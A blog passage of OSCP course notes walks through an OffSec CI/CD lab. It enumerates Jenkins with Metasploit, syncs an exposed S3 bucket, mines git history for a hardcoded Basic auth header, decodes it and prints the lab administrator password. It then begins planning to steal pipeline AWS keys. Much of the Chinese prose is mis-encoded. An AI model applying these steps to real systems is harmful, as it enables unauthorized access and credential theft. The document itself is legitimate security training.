---
title: "[OSCP, PEN-200] Instructional notes - Part 8"
date: 2025-03-20
author: "CHW"
tags:
  - offsec
description: "[OSCP, PEN-200] Instructional notes - Part 8 (Cloud Infra Attacksï¼ˆGitea, Jenkins), Simulated PT (access internal, Admin priv, access DC, ...etc)"
---


[OSCP, PEN-200] Instructional notes - Part 8
===


# Table of Contents
[TOC]

# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 1"](https://chw41.github.io/b1og/oscp-pen-200-instructional-notes---part-1/)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 2"](https://chw41.github.io/b1og/oscp-pen-200-instructional-notes---part-2/)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 3"](https://chw41.github.io/b1og/oscp-pen-200-instructional-notes---part-3/)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 4"](https://chw41.github.io/b1og/oscp-pen-200-instructional-notes---part-4/)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 5"](https://chw41.github.io/b1og/oscp-pen-200-instructional-notes---part-5/)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 6"](https://chw41.github.io/b1og/oscp-pen-200-instructional-notes---part-6/)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 7"](https://chw41.github.io/b1og/oscp-pen-200-instructional-notes---part-7/)

>[!Caution]
> æ¥çºŒ [[OSCP, PEN-200] Instructional notes - Part 7](https://chw41.github.io/b1og/oscp-pen-200-instructional-notes---part-7/) å…§å®¹

# Attacking AWS Cloud Infrastructure
AWS Cloud Infrastructure çš„æ”»æ“Šï¼Œé‡å° CI/CD çš„æ¼æ´èˆ‡å¯èƒ½çš„æ”»æ“Šæ–¹å¼ã€‚CI/CD æ˜¯ç¾ä»£é›²ç«¯ç’°å¢ƒçš„æ ¸å¿ƒï¼Œèƒ½å¤ è‡ªå‹•åŒ–æ‡‰ç”¨ç¨‹å¼çš„å»ºç½®ã€æ¸¬è©¦èˆ‡éƒ¨ç½²ï¼Œæå‡é–‹ç™¼æ•ˆç‡èˆ‡ç©©å®šæ€§ã€‚
>[!Tip]
>[CI/CD](https://en.wikipedia.org/wiki/CI/CD):
>Continuous Integration (CI) and Continuous Delivery (CD)

CI/CD OWASP Top 10
- CICD-SEC-1: Insufficient Flow Control Mechanisms
    - CI/CD æµç¨‹ç¼ºä¹åš´æ ¼çš„æª¢æŸ¥æ©Ÿåˆ¶ï¼Œèƒ½å¤ ç¹éå®‰å…¨é™åˆ¶
- CICD-SEC-2: Inadequate Identity and Access Management
    - ç®¡ç†å“¡æœªé©ç•¶é…ç½®è§’è‰²èˆ‡æ¬Šé™ï¼Œå°è‡´è¼•æ˜“ææ¬Š
- CICD-SEC-3: Dependency Chain Abuse
    - é€éæ±¡æŸ“æˆ–ç«„æ”¹ä¾è³´é …ï¼ˆç¬¬ä¸‰æ–¹å¥—ä»¶ï¼‰ï¼Œè®“ CI/CD pipeline åŸ·è¡Œæƒ¡æ„ç¨‹å¼ç¢¼
- CICD-SEC-4: Poisoned Pipeline Execution (PPE)
    - ç²å–å° å»ºç½®æˆ–éƒ¨ç½²è…³æœ¬ çš„æ§åˆ¶æ¬Šï¼Œå¯èƒ½å°è‡´ Reverse Shell æˆ–æ©Ÿå¯†è³‡è¨Šç«Šå–ã€‚
- CICD-SEC-5: Insufficient PBAC (Pipeline-Based Access Controls)
    - CI/CD pipeline æœªå¦¥å–„ä¿è­·æ•æ„Ÿè³‡æ–™ï¼Œå¯èƒ½å°è‡´ç«Šå–æˆ–æ¿«ç”¨æ©Ÿå¯†è³‡è¨Š
- CICD-SEC-6: Insufficient Credential Hygiene
    - å¯†ç¢¼ã€æ˜æ–‡å­˜å„²æ†‘è­‰ï¼Œæˆ– API Token æ´©æ¼
- CICD-SEC-7: Insecure System Configuration
    - CI/CD ä¼ºæœå™¨èˆ‡ç›¸é—œ application å­˜åœ¨å®‰å…¨æ¼æ´
- CICD-SEC-8: Ungoverned Usage of 3rd Party Services
    - ä½¿ç”¨ GitHubã€Docker Hub ç­‰ç¬¬ä¸‰æ–¹æœå‹™æ™‚ï¼Œè‹¥æœªå¦¥å–„ç®¡ç†æ¬Šé™
- CICD-SEC-9: Improper Artifact Integrity Validation
    - CI/CD pipeline æœªé©—è­‰ Artifactscæ˜¯å¦é­ç¯¡æ”¹ï¼Œå¯èƒ½å…è¨±æ¤å…¥æƒ¡æ„ç¨‹å¼ç¢¼
- CICD-SEC-10: Insufficient Logging and Visibility
    - CI/CD pipeline ç¼ºä¹è©³ç´°çš„æ—¥èªŒè¨˜éŒ„èˆ‡ç›£æ§ï¼Œå°è‡´æ”»æ“Šé›£ä»¥è¢«åµæ¸¬

## About the Public Cloud Labs
ï¼šå†æ¬¡ç”³æ˜ã€Œç•¶å€‹å¥½é§­å®¢ã€\
![image](https://hackmd.io/_uploads/rJTTPFe3Jg.png)
## Leaked Secrets to Poisoned Pipeline - Lab Design
 Lab æ¨¡æ“¬ CI/CD ç³»çµ±çš„æ”»æ“Šå ´æ™¯ï¼ŒåŒæ™‚å•Ÿå‹• å¤šå€‹æœå‹™ï¼Œé€™åŒ…æ‹¬ï¼š
1. åŸå§‹ç¢¼ç®¡ç†ç³»çµ±ï¼ˆSCMï¼ŒSource Code Managementï¼‰
2. è‡ªå‹•åŒ–ä¼ºæœå™¨ï¼ˆJenkinsï¼‰
3. å„²å­˜åº«ï¼ˆRepository Servicesï¼‰
4. Actual application
5. æ”¯æ´ application é‹ä½œçš„ infrastructure


Lab åŒ…å«ä»¥ä¸‹ ä¸‰å€‹ä¸»è¦ componentsï¼Œæ¯å€‹ components å°æ‡‰ ä¸€å€‹ subdomain
- Gitea: åŸå§‹ç¢¼ç®¡ç†ç³»çµ±ï¼ˆSCMï¼‰ï¼Œé¡ä¼¼ GitHub æˆ– GitLab
- Jenkins: è‡ªå‹•åŒ–ä¼ºæœå™¨ï¼Œç”¨æ–¼åŸ·è¡Œ CI/CD Pipeline
- Application: ç›®æ¨™æ‡‰ç”¨ç¨‹å¼ï¼Œæ˜¯æ”»æ“Šçš„ä¸»è¦å°è±¡ã€‚

![image](https://hackmd.io/_uploads/rknwO9-nkg.png)
### Accessing the Labs
#### 1. åˆ—å‡ºç›®å‰çš„ç¶²è·¯é€£ç·š
```
â”Œâ”€â”€(chwã‰¿CHW)-[~]
â””â”€$ nmcli connection
NAME                UUID                                  TYPE      DEVICE 
Wired connection 1  3fad19bc-1223-42bb-8a71-4519ecca8499  ethernet  eth0   
lo                  735b75b5-8789-4b4b-b693-05a081c177d7  loopback  lo     
tun0                b3c266a9-9280-43b6-8bf8-8dfcc199544d  tun       tun0  
```
> `Wired connection 1`ï¼šä¸»è¦çš„ç¶²è·¯é€£ç·šåç¨±ï¼ˆæœ‰ç·šç¶²è·¯ï¼‰\
`eth0`ï¼šç›®å‰ä½¿ç”¨çš„ç¶²è·¯ä»‹é¢
#### 2. è¨­å®š DNS Server
ä½¿ç”¨ nmcli æŒ‡å®šå¯¦é©—å®¤æä¾›çš„ DNS ä¼ºæœå™¨ IP
```
â”Œâ”€â”€(chwã‰¿CHW)-[~]
â””â”€$ sudo nmcli connection modify "Wired connection 1" ipv4.dns "{DNS Server IP}"
[sudo] password for chw: 

â”Œâ”€â”€(chwã‰¿CHW)-[~]
â””â”€$ sudo systemctl restart NetworkManager
```
#### 3. é©—è­‰ DNS è¨­å®šæ˜¯å¦ç”Ÿæ•ˆ
æª¢æŸ¥ `/etc/resolv.conf`
```                                
â”Œâ”€â”€(chwã‰¿CHW)-[~]
â””â”€$ cat /etc/resolv.conf
# Generated by NetworkManager
search localdomain
nameserver {DNS Server IP}                                                                                               
â”Œâ”€â”€(chwã‰¿CHW)-[~]
â””â”€$ nslookup git.offseclab.io
Server:         {DNS Server IP}
Address:        {DNS Server IP}#53

Non-authoritative answer:
Name:   git.offseclab.io
Address: {LAB IP}
```
> æˆåŠŸè§£æ `git.offseclab.io` Domain

>[!Tip]
>æ¯æ¬¡é‡å•Ÿ LAB å¾Œï¼Œéœ€è¦é‡æ–°è¨­å®š DNS\
>`sudo nmcli connection modify "Wired connection 1" ipv4.dns ""`
##  Enumeration
 Enumerate a CI/CD System
### Enumerating Jenkins
åœ¨ `automation.offseclab.io` ç€è¦½ Jenkins\
![image](https://hackmd.io/_uploads/B15rfbNh1l.png)
> å¦‚æœ Jenkins å•Ÿç”¨äº†ï¼Œ`self-registration enabled`ï¼Œé€šå¸¸æœƒæä¾›ã€Œè¨»å†Šã€é¸é …ã€‚

#### 1. ä½¿ç”¨ Metasploit Enumeration Jenkins
ç”±æ–¼ ç™»å…¥å—é™ï¼Œæ”¹ç”¨ Metasploit ä¾† è‡ªå‹•åŒ–æƒæ
##### 1.1 åˆå§‹åŒ– Metasploit è³‡æ–™åº« & å•Ÿå‹•
```
â”Œâ”€â”€(chwã‰¿CHW)-[~]
â””â”€$ sudo msfdb init
â”Œâ”€â”€(chwã‰¿CHW)-[~]
â””â”€$ msfconsole --quiet
msf6 >
```
é¸æ“‡ Jenkins æƒæ module
```
msf6 > use auxiliary/scanner/http/jenkins_enum
msf6 auxiliary(scanner/http/jenkins_enum) > show options

Module options (auxiliary/scanner/http/jenkins_enum):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:por
                                         t][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/d
                                         ocs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /jenkins/        yes       The path to the Jenkins-CI application
   THREADS    1                yes       The number of concurrent threads (max one per host)
   VHOST                       no        HTTP server virtual host


View the full module info with the info, or info -d command.
```
##### 1.2 è¨­å®šæƒæç›®æ¨™
å°‡ ç›®æ¨™ä¼ºæœå™¨è¨­å®šç‚º `automation.offseclab.io`ï¼Œä¸¦å°‡ `TARGETURI` è¨­ç‚º `/`
```
msf6 auxiliary(scanner/http/jenkins_enum) > set RHOSTS automation.offseclab.io
msf6 auxiliary(scanner/http/jenkins_enum) > set TARGETURI /
```
#### 1.3 åŸ·è¡Œæƒæ
```
msf6 auxiliary(scanner/http/jenkins_enum) > run

[+] 54.86.68.66:80        - Jenkins Version 2.385
[*] /script restricted (403)
[*] /view/All/newJob restricted (403)
[*] /asynchPeople/ restricted (403)
[*] /systemInfo restricted (403)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
> å–å¾— Jenkins ç‰ˆæœ¬ï¼š2.385\
ğŸ¥š è¨±å¤š API å›æ‡‰ 403 Forbidden

å„˜ç®¡æ²’æœ‰æ‹¿åˆ°æ¬Šé™ï¼Œä½†æˆ‘å€‘å–å¾—äº† Jenkins ç‰ˆæœ¬ï¼Œå¯ä»¥å°‹æ‰¾å·²çŸ¥æ¼æ´ï¼ˆCVEï¼‰

#### - æœå°‹å…¬é–‹æ¼æ´
ä½¿ç”¨ `Exploit-DB` æˆ– `CVE Database` æœå°‹: Jenkins Version 2.385
#### - Directory busting
`dirb` æˆ– `dirseaarch`

ç‚ºäº†ä¸æµªè²»æ™‚é–“ï¼Œå…ˆè½‰å‘ `git.offseclab.io`ï¼ˆGitea Serverï¼‰ï¼Œå°‹æ‰¾å…¶ä»–å¯èƒ½çš„æ”»æ“Šé»ã€‚

### Enumerating the Git Server
Git ä¼ºæœå™¨ Enumeration:
- è¨—ç®¡å‹ hosted SCMï¼ˆGitHubã€GitLab ç­‰ï¼‰
    - è¨—ç®¡åœ¨ ç¬¬ä¸‰æ–¹é›²ç«¯ï¼ˆå¦‚ GitHubã€GitLabï¼‰ã€‚
    - ä»¥ é–‹æ”¾æƒ…å ±è’é›†ï¼ˆOSINTï¼‰ ç‚ºä¸»ï¼Œä¾‹å¦‚ï¼š
        - æœå°‹å…¬é–‹ repo
        - æŸ¥çœ‹çµ„ç¹”å…§çš„æˆå“¡
        - åˆ†æéå¾€çš„ Commit
    - é€šå¸¸ä¸æœƒå° GitHub æˆ– GitLab æœ¬èº«é€²è¡Œæ”»æ“Šï¼Œå› ç‚ºé€™æ˜¯ç¬¬ä¸‰æ–¹è³‡ç”¢ï¼Œä¸”å®ƒå€‘çš„å®‰å…¨æ€§è¼ƒé«˜ã€‚

- è‡ªæ¶ own SCMï¼ˆå¦‚ Giteaã€Self-hosted GitLabï¼‰
    - ä¼æ¥­è‡ªè¡Œæ¶è¨­ SCM ä¼ºæœå™¨ã€‚
    - å¯ä»¥é‡å° SCM è»Ÿé«”æœ¬èº«é€²è¡Œæ¼æ´æ¸¬è©¦ï¼Œä¾‹å¦‚ï¼š
        - æ¢æ¸¬ç‰ˆæœ¬è™Ÿï¼Œæœå°‹å·²çŸ¥æ¼æ´
        - æ¸¬è©¦ API æ˜¯å¦é–‹æ”¾æœªæˆæ¬Šå­˜å–
        - å˜—è©¦ Brute-force ä½¿ç”¨è€…å¯†ç¢¼
        - æœå°‹å…¬é–‹çš„æ©Ÿå¯†è³‡è¨Šï¼ˆå¦‚ API é‡‘é‘°ã€æ†‘è­‰ï¼‰

#### 1. è¨ªå• SCM Server
http://git.offseclab.io/\
![image](https://hackmd.io/_uploads/rynb3ZV2ke.png)
> Explore: ç”¨ä¾†æœå°‹å…¬é–‹çš„å°ˆæ¡ˆæˆ–ä½¿ç”¨è€…
> Sign In: éœ€è¦å¸³è™Ÿå¯†ç¢¼ 
#### 2. ç¢ºèª SCM ç‰ˆæœ¬
![image](https://hackmd.io/_uploads/ByDS3b4hyl.png)
> Version: 1.18.0

#### 3. Explore å…¬é–‹çš„ Repositories
![image](https://hackmd.io/_uploads/SkBZT-N3kg.png)
å…±æœ‰ 5 å€‹ users: `Billy`, `Jack`, `Lucy`, `Roger`, `administrator`

å¦‚æœ SCM ç›®å‰æ²’æœ‰é–‹æ”¾çš„æ”»æ“Šé»ï¼Œæˆ‘å€‘å¯ä»¥è½‰å‘ Applicationï¼ˆapp.offseclab.ioï¼‰ï¼Œçœ‹çœ‹æ˜¯å¦æœ‰ æ†‘è­‰æ´©æ¼ æˆ–å…¶ä»–æ¼æ´
### Enumerating the Application
#### 1. è¨ªå• Application
http://app.offseclab.io/\
![image](https://hackmd.io/_uploads/rJecC-NhJx.png)
#### 2. ä½¿ç”¨ dirb æƒæéš±è—ç›®éŒ„
å¯èƒ½æœ‰æœªåˆ—å‡ºçš„ API æˆ–ç®¡ç†ç«¯é»

#### 3. æª¢æŸ¥ç¶²é  HTML Source code
å› ç‚ºæ‡‰ç”¨ç¨‹å¼æ˜¯è‡ªè¨‚çš„ï¼ˆCustom Applicationï¼‰ï¼Œå¯èƒ½åŒ…å«é–‹ç™¼è€…éºæ¼çš„è³‡è¨Šï¼Œæ‰“é–‹ ç¶²é åŸå§‹ç¢¼ï¼ˆView Page Sourceï¼‰ã€‚
ä½¿ç”¨ `view-source:`+`http://app.offseclab.io/index.html`ï¼Œå¯ä»¥çœ‹ç¶²é åŸå§‹ç¢¼\
![image](https://hackmd.io/_uploads/Bk_zefV31g.png)
> ç™¼ç¾ S3 bucket

#### 4. æ¸¬è©¦ S3 Bucket æ¬Šé™
https://staticcontent-{S3BucketID}.s3.us-east-1.amazonaws.com/\
![image](https://hackmd.io/_uploads/S1CPbz4nyg.png)
> AccessDenied
> ä½†è‡³å°‘çŸ¥é“è©² Bucket æ˜¯å…¬é–‹çš„ï¼Œå¯èƒ½é‚„æœ‰å…¶ä»–å¯ç”¨çš„æ”»æ“Šæ–¹å¼\
ä¸‹ä¸€æ­¥ï¼šä½¿ç”¨ dirb æ¸¬è©¦æ˜¯å¦æœ‰å¯å­˜å–çš„éš±è—æª”æ¡ˆ

#### 5. ä½¿ç”¨ dirb å˜—è©¦åˆ—èˆ‰ S3 Bucket
```
â”Œâ”€â”€(chwã‰¿CHW)-[~]
â””â”€$ dirb https://staticcontent-{S3Bucket ID}/.s3.us-east-1.amazonaws.com 
...
GENERATED WORDS: 4612                                                          

---- Scanning URL: https://staticcontent-{S3Bucket ID}/.s3.us-east-1.amazonaws.com/ ----
+ https://staticcontent-{S3Bucket ID}/.s3.us-east-1.amazonaws.com/.git/HEAD (CODE:200|SIZE:23)
...
```
>`https://staticcontent-{S3Bucket ID}/.s3.us-east-1.amazonaws.com/.git/HEAD`
> Bucket å…§æœ‰ `.git/HEAD`ï¼Œè¡¨ç¤ºæ•´å€‹ Git Bucket å­˜æ”¾åœ¨ S3 ä¸Š\
> å¦‚æœèƒ½å¤ å­˜å– `.git` å…§çš„å…¶ä»–æª”æ¡ˆï¼Œå°±å¯èƒ½é‚„åŸæ•´å€‹ç¨‹å¼ç¢¼åº«

å–®ç´”ç”¨ dirb é€ä¸€æ¸¬è©¦ Git æª”æ¡ˆæ•ˆç‡ä¸é«˜ï¼Œéœ€è¦æ›´æœ‰æ•ˆçš„æ–¹æ³•ä¾†ä¸‹è¼‰è³‡æ–™

#### 6. ä½¿ç”¨ AWS CLI å˜—è©¦åˆ—å‡º S3 Bucket
é›–ç„¶ public ç„¡æ³•ç›´æ¥è®€å–å…§å®¹ï¼Œä½† AWS Authenticated User å¯èƒ½ä»ç„¶èƒ½å­˜å–
```
â”Œâ”€â”€(chwã‰¿CHW)-[~]
â””â”€$ aws configure
AWS Access Key ID [None]: {Access Key ID}
AWS Secret Access Key [None]: {Secret Access Key}
Default region name [None]: us-east-1
Default output format [None]: 

â”Œâ”€â”€(chwã‰¿CHW)-[~]
â””â”€$ aws s3 ls staticcontent-{S3Bucket ID}/
                           PRE .git/
                           PRE images/
                           PRE scripts/
                           PRE webroot/
2025-03-16 04:12:30        972 CONTRIBUTING.md
2025-03-16 04:12:30         79 Caddyfile
2025-03-16 04:12:30        407 Jenkinsfile
2025-03-16 04:12:30        879 README.md
2025-03-16 04:12:30        176 docker-compose.yml
```
> æˆåŠŸåˆ—å‡ºå­˜å„²æ¡¶å…§å®¹
>> `.git/` ç›®éŒ„: åŒ…å«å®Œæ•´çš„ç¨‹å¼ç¢¼åº«
`Jenkinsfile`: Jenkins Pipeline è¨­å®šæª”ï¼Œå¯èƒ½åŒ…å«æ†‘è­‰æˆ– API é‡‘é‘°\
`docker-compose.yml`: å¯èƒ½åŒ…å«ç’°å¢ƒè®Šæ•¸æˆ–è¨­å®šæª”\
`README.md`ã€`Caddyfile`: å¯èƒ½é€éœ²ä¼ºæœå™¨æ¶æ§‹è³‡è¨Š

## Discovering Secrets
- ç™¼ç¾å“ªäº›æ–‡ä»¶å¯ä»¥è¨ªå•
- åˆ†æ Git æ­·å²è¨˜éŒ„

### Downloading the Bucket
#### 1. åˆ—å‡º S3 Bucket å…§å®¹
```
â”Œâ”€â”€(chwã‰¿CHW)-[~]
â””â”€$ aws s3 ls staticcontent-{S3Bucket ID}/
                           PRE .git/
                           PRE images/
                           PRE scripts/
                           PRE webroot/
2025-03-16 04:12:30        972 CONTRIBUTING.md
2025-03-16 04:12:30         79 Caddyfile
2025-03-16 04:12:30        407 Jenkinsfile
2025-03-16 04:12:30        879 README.md
2025-03-16 04:12:30        176 docker-compose.yml
```
#### 2. æ¸¬è©¦å¯å­˜å–çš„æ–‡ä»¶
å˜—è©¦ä¸‹è¼‰ `README.md` ç¢ºèªæ˜¯å¦æœ‰æ¬Šé™
```
â”Œâ”€â”€(chwã‰¿CHW)-[~]
â””â”€$ aws s3 cp s3://staticcontent-{S3Bucket ID}//README.md ./
download: s3://staticcontent-{S3Bucket ID}//README.md to ./README.md

â”Œâ”€â”€(chwã‰¿CHW)-[~]
â””â”€$ cat README.md
...
## How to use

To use the content in this repository, simply clone or download the repository and access the files as needed. If you have access to the S3 bucket and would like to upload the content to the bucket, you can use the provided script:

./scripts/upload-to-s3.sh
...
```
> ä¸‹è¼‰æˆåŠŸï¼Œè¡¨ç¤º è©² bucket éƒ¨åˆ†å…§å®¹æ˜¯å¯è®€å–

å˜—è©¦ä¸‹è¼‰æ•´å€‹ S3 bucket
```
â”Œâ”€â”€(chwã‰¿CHW)-[~]
â””â”€$ mkdir S3-bucket

â”Œâ”€â”€(chwã‰¿CHW)-[~]
â””â”€$ cd S3-bucket 
         
â”Œâ”€â”€(chwã‰¿CHW)-[~/S3-bucket]
â””â”€$ aws s3 sync s3://staticcontent-{S3Bucket ID}/ ./
...

â”Œâ”€â”€(chwã‰¿CHW)-[~/S3-bucket]
â””â”€$ tree                               
.
â”œâ”€â”€ CONTRIBUTING.md
â”œâ”€â”€ Caddyfile
â”œâ”€â”€ Jenkinsfile
â”œâ”€â”€ README.md
â”œâ”€â”€ docker-compose.yml
â”œâ”€â”€ images
â”‚Â Â  â”œâ”€â”€ bunny.jpg
â”‚Â Â  â”œâ”€â”€ golden-with-flower.jpg
â”‚Â Â  â”œâ”€â”€ kittens.jpg
â”‚Â Â  â””â”€â”€ puppy.jpg
â”œâ”€â”€ scripts
â”‚Â Â  â”œâ”€â”€ update-readme.sh
â”‚Â Â  â””â”€â”€ upload-to-s3.sh
â””â”€â”€ webroot
    â””â”€â”€ index.html

4 directories, 12 files
```
> æœ‰æ¬Šé™è®€å–æ•´å€‹ S3 bucket

#### 3. åˆ†æ script
- åˆ†æ `upload-to-s3.sh` script
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/S3-bucket]
â””â”€$ cat scripts/upload-to-s3.sh 
# Upload images to s3

SCRIPT_DIR=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )

AWS_PROFILE=prod aws s3 sync $SCRIPT_DIR/../ s3://staticcontent-{S3Bucket ID}/ 
```
> æœªç™¼ç¾å¯ç”¨çš„è³‡è¨Š

- åˆ†æ `update-readme.sh` script
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/S3-bucket]
â””â”€$ cat scripts/upload-to-s3.sh
```
```sh
# Update Readme to include collaborators images to s3

SCRIPT_DIR=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )

SECTION="# Collaborators"
FILE=$SCRIPT_DIR/../README.md

if [ "$1" == "-h" ]; then
  echo "Update the collaborators in the README.md file"
  exit 0
fi

if [ "$#" -ne 2 ]; then
  echo "Usage: $0 USERNAME PASSWORD"
  exit 1
fi

username=$1
password=$2

auth_header=$(printf "Authorization: Basic %s\n" "$(echo -n "$username:$password" | base64)")

USERNAMES=$(curl -X 'GET' 'http://git.offseclab.io/api/v1/repos/Jack/static_content/collaborators' -H 'accept: application/json' -H $auth_header | jq .\[\].username |  tr -d '"')

sed -i "/^$SECTION/,/^#/{/$SECTION/d;//!d}" $FILE
echo "$SECTION" >> $FILE
echo "$USERNAMES" >> $FILE
echo "" >> $FILE
```
> å¾ Git ä¼ºæœå™¨ï¼ˆgit.offseclab.ioï¼‰ç²å– repo åå–®\
Jack æ˜¯é€™å€‹ repo çš„æ“æœ‰è€…\
æ¥å— `USERNAME` å’Œ `PASSWORD` ä½œç‚ºåƒæ•¸ï¼Œæ¥è‘—ç™¼é€ API request\
>> å¦‚æœèƒ½æ‰¾åˆ°åŸ·è¡Œéé€™å€‹è…³æœ¬çš„ user bash historyï¼Œå¯èƒ½æ‹¿åˆ°æ†‘è­‰

### Searching for Secrets in Git
#### 1. ä½¿ç”¨ gitleaks è‡ªå‹•æœå°‹æ•æ„Ÿè³‡è¨Š
å®‰è£ `gitleaks`
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/S3-bucket]
â””â”€$ sudo apt update
â”Œâ”€â”€(chwã‰¿CHW)-[~/S3-bucket]
â””â”€$ sudo apt install -y gitleaks
```
åŸ·è¡Œ `gitleaks` æƒæ Git repo
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/S3-bucket]
â””â”€$ gitleaks detect

    â—‹
    â”‚â•²
    â”‚ â—‹
    â—‹ â–‘
    â–‘    gitleaks

6:33AM INF 7 commits scanned.
6:33AM INF scan completed in 63.4ms
6:33AM INF no leaks found
```
> æ²’æœ‰ç™¼ç¾æ•æ„Ÿè³‡è¨Š

#### 2. æ‰‹å‹•æª¢æŸ¥ Git history
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/S3-bucket]
â””â”€$ git log
commit 85898c851b959830ec6b4669726434607df652ac (HEAD -> master, origin/master)
Author: Jack <jack@offseclab.io>
Date:   Sat Mar 15 08:12:27 2025 +0000

    Add Jenkinsfile

commit a93d6e3d4c5227878d89fa81451f988373e78662
Author: Jack <jack@offseclab.io>
Date:   Fri Mar 14 08:12:27 2025 +0000

    Fix issue
...
```
> `Fix issue`: å¯èƒ½èˆ‡å®‰å…¨æ¼æ´æœ‰é—œ\
`Add Jenkinsfile`: å¯èƒ½èˆ‡ CI/CD pipeline ç›¸é—œ

#### 3. åˆ†æ Git è®Šæ›´è¨˜éŒ„
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/S3-bucket]
â””â”€$ git show a93d6e3d4c5227878d89fa81451f988373e78662
...
-USERNAMES=$(curl -X 'GET' 'http://git.offseclab.io/api/v1/repos/Jack/static_content/collaborators' -H 'accept: application/json' -H 'authorization: Basic YWRtaW5pc3RyYXRvcjphMm53c3VkdzFmM2lxbDhj' | jq .\[\].username |  tr -d '"')
+# Check if both arguments are provided
+if [ "$#" -ne 2 ]; then
+  # If not, display a help message
+  echo "Usage: $0 USERNAME PASSWORD"
+  exit 1
+fi
+
+# Store the arguments in variables
+username=$1
+password=$2
+
+auth_header=$(printf "Authorization: Basic %s\n" "$(echo -n "$username:$password" | base64)")
+
+USERNAMES=$(curl -X 'GET' 'http://git.offseclab.io/api/v1/repos/Jack/static_content/collaborators' -H 'accept: application/json' -H $auth_header | jq .\[\].username |  tr -d '"')
...
```
> ä¿®æ”¹å‰çš„åŸå§‹è…³æœ¬ç›´æ¥ä½¿ç”¨ hard coded çš„ API é‡‘é‘°ï¼ˆBase64 ç·¨ç¢¼çš„ authorization: Basicï¼‰\
ä¿®æ”¹ç‚ºå¾ cmd åƒæ•¸è¼¸å…¥å¸³è™Ÿå¯†ç¢¼
>> éå»æäº¤çš„ API é‡‘é‘°å¯èƒ½æœƒæœ‰æ•ˆ

- è§£ç¢¼ hard coded çš„ API é‡‘é‘°
![image](https://hackmd.io/_uploads/rkqMoX4hkg.png)

#### 4. ä½¿ç”¨è§£ç¢¼çš„æ†‘è­‰ç™»å…¥ SCM ä¼ºæœå™¨
http://git.offseclab.io/user/login\
![image](https://hackmd.io/_uploads/rkd2i7Enkl.png)
> `administrator`:`a2nwsudw1f3iql8c`

æˆåŠŸç™»å…¥ï¼š\
![image](https://hackmd.io/_uploads/SkYAsmE2Jx.png)

## Poisoning the Pipeline
å¦‚ä½•åˆ©ç”¨ CI/CD Pipeline ä¾†åŸ·è¡Œæƒ¡æ„ä»£ç¢¼ï¼ˆPoisoning the Pipelineï¼‰ï¼Œä»¥ç²å– é ç«¯ Shell å­˜å– Jenkins ä¼ºæœå™¨
> åœ¨ Jenkins ä¸­ï¼Œé€šå¸¸å®šç¾©åœ¨ `Jenkinsfile`ï¼Œå¦‚æœèƒ½å¤  ä¿®æ”¹ Jenkinsfileï¼Œå°±å¯ä»¥å¯«å…¥æƒ¡æ„æŒ‡ä»¤ï¼Œè®“ Pipeline åŸ·è¡Œæˆ‘å€‘çš„æ”»æ“Š payloadã€‚
### Enumerating the Repositories
ç›®å‰å·²ä½¿ç”¨ `administrator` ç™»å…¥ Giteaï¼ˆSCM Serverï¼‰ï¼Œå†æ¬¡é»æ“Šã€ŒExploreã€ä¾†æŸ¥çœ‹ æ‰€æœ‰çš„ Repositoryã€‚\
![image](https://hackmd.io/_uploads/B1oPpXN3yx.png)
> å¤šäº† `image-transform`ï¼Œä¸” `image-transform` ä¸­æœ‰ `Jenkinsfile`

#### 1. æª¢æŸ¥ `static_content` çš„ Jenkinsfile
![image](https://hackmd.io/_uploads/H1aFCmV31x.png)
> é€™ä»½ Jenkinsfile ç›®å‰åª echo è¨Šæ¯ï¼Œä¸¦æ²’æœ‰å¯¦éš›åŸ·è¡Œä»»ä½•æœ‰æ•ˆçš„å»ºç½®æ­¥é©Ÿã€‚

#### 2. æª¢æŸ¥ `image-transform` çš„ Jenkinsfile
![image](https://hackmd.io/_uploads/HkzZyEN2yl.png)
> é€™ä»½ Jenkinsfile æœƒåŸ·è¡Œ [CloudFormation](https://docs.aws.amazon.com/cloudformation/index.html) é…ç½®
> >
`withAWS(region:'us-east-1', credentials:'aws_key')
Jenkins` è¼‰å…¥ AWS é‡‘é‘°ï¼ˆ`AWS_ACCESS_KEY_ID`ã€`AWS_SECRET_ACCESS_KEY`ï¼‰\
å˜—è©¦ç«Šå–é€™äº›æ†‘è­‰ï¼Œé€²ä¸€æ­¥å…¥ä¾µ AWS

>[!Important]
>ä½¿ç”¨ `cfnUpdate` ä¾†å»ºç«‹ CloudFormation Stack\
è¡¨ç¤ºé€™å€‹ Pipeline æ“æœ‰è‡³å°‘ AWS CloudFormation ç®¡ç†æ¬Šé™ï¼Œå¯èƒ½å…è¨±æˆ‘å€‘ å‰µå»ºæ–°è³‡æºã€ä¿®æ”¹ S3 Bucketã€‚

#### 3. æª¢æŸ¥ CloudFormation template
##### 3.1 CloudFormation conf
Jenkinsfile æœƒä½¿ç”¨ `image-processor-template.yml`ï¼Œæª¢æŸ¥æª”æ¡ˆ\
![image](https://hackmd.io/_uploads/rkl1hl4Nnye.png)
> CloudFormation å»ºç«‹äº†å…©å€‹ S3 Bucketï¼Œç”¨ä¾†å„²å­˜åŸåœ–å’Œç¸®åœ–

##### 3.2 lambda function
![image](https://hackmd.io/_uploads/H1XpZVE21l.png)
> Lambda function å°‡åœ–ç‰‡å¾ `SOURCE_BUCKET` ç§»å‹•åˆ° `DESTINATION_BUCKET`\
